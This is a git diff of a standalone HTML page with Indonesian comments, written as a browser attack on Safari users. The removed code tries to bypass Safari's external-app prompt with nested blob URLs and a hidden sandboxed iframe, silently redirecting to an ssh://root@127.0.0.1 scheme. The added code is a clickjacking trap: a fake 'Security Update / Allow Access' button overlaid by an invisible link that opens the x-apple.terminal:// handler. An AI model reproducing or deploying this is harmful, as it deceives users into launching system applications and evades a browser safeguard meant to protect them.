@@ -7,99 +7,69 @@
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #1a1a1a;
-    color: #fff;
+    background: #f0f4f8;
     font-family: -apple-system, BlinkMacSystemFont, sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
     margin: 0;
-    user-select: none;
   }
-  button {
+  .panel {
+    background: #fff;
+    padding: 40px;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    text-align: center;
+    position: relative;
+  }
+  h1 { color: #333; margin-bottom: 10px; }
+  p { color: #666; margin-bottom: 20px; }
+  
+  /* Tombol Palsu (Hanya Visual) */
+  .fake-btn {
     padding: 15px 30px;
-    font-size: 18px;
     background: #007aff;
-    color: white;
-    border: none;
+    color: #fff;
     border-radius: 8px;
-    cursor: pointer;
+    font-size: 18px;
     font-weight: bold;
+    display: inline-block;
   }
-  iframe { display: none; }
+
+  /* TAG <a> ASLI (Disembunyikan tapi menutupi tombol) */
+  #trapLink {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    opacity: 0; /* Transparan */
+    cursor: pointer;
+    z-index: 10;
+  }
 </style>
 </head>
 <body>
 
-<button id="startBtn">Verify System</button>
+<div class="panel">
+  <h1>🔒 Security Update</h1>
+  <p>Klik tombol di bawah untuk mengizinkan akses.</p>
+  
+  <!-- Tombol Palsu -->
+  <div class="fake-btn">Allow Access</div>
+
+  <!-- Tag <a> Penjebak (Memicu Terminal) -->
+  <!-- Target href langsung ke skema kustom -->
+  <a href="x-apple.terminal://" id="trapLink">Trap</a>
+</div>
 
 <script>
-(function () {
-  'use strict';
-
-  document.getElementById('startBtn').addEventListener('click', function() {
-    
-    // Skema target yang ingin dibuka
-    var targetScheme = "ssh://root@127.0.0.1";
-
-    // ============================================
-    // TRIK 1: DOUBLE BLOB JUMP (Menghindari Deteksi Safari)
-    // ============================================
-    // Kita membuat Blob pertama yang berisi script untuk membuat Blob kedua.
-    // Redirect terjadi dari Blob kedua, yang mungkin dianggap Safari sebagai 
-    // "internal execution" dan melewati pop-up eksternal.
-
-    var innerPayload = `
-      <!DOCTYPE html>
-      <html>
-      <body>
-        <script>
-          // Redirect diam-diam (Silent)
-          window.location.replace("${targetScheme}");
-        <\/script>
-      </body>
-      </html>
-    `;
-
-    // Blob Pertama (Wrapper)
-    var wrapperPayload = `
-      <!DOCTYPE html>
-      <html>
-      <body>
-        <script>
-          // Buat Blob kedua di dalam Blob pertama
-          var innerHTML = \`${innerPayload}\`;
-          var innerBlob = new Blob([innerHTML], { type: 'text/html' });
-          var innerUrl = URL.createObjectURL(innerBlob);
-          
-          // Redirect ke Blob kedua (memicu navigasi top-level dari dalam Blob)
-          window.location.replace(innerUrl);
-        <\/script>
-      </body>
-      </html>
-    `;
-
-    var outerBlob = new Blob([wrapperPayload], { type: 'text/html' });
-    var outerUrl = URL.createObjectURL(outerBlob);
-
-    // ============================================
-    // TRIK 2: IFRAME SANDBOX (Untuk UI Spoofing)
-    // ============================================
-    // Kita coba juga eksekusi via iframe yang tersembunyi.
-    // Safari kadang mengizinkan redirect skema dari iframe tanpa pop-up.
-    
-    var iframe = document.createElement('iframe');
-    iframe.sandbox = "allow-scripts allow-top-navigation";
-    iframe.src = outerUrl;
-    iframe.style.display = "none";
-    document.body.appendChild(iframe);
-
-    // Trik 3: Langsung navigasi tab utama
-    window.location.replace(outerUrl);
+  // Trik tambahan: Jika terminal tidak terbuka, coba skema SSH
+  // (Anda bisa ganti href di atas menjadi ssh://root@127.0.0.1)
+  
+  document.getElementById('trapLink').addEventListener('click', function(e) {
+    console.log("[!] Anchor diklik. Safari sedang memproses redirect...");
+    // Tidak perlu preventDefault agar Safari memprosesnya secara native.
   });
-
-})();
 </script>
 </body>
 </html>
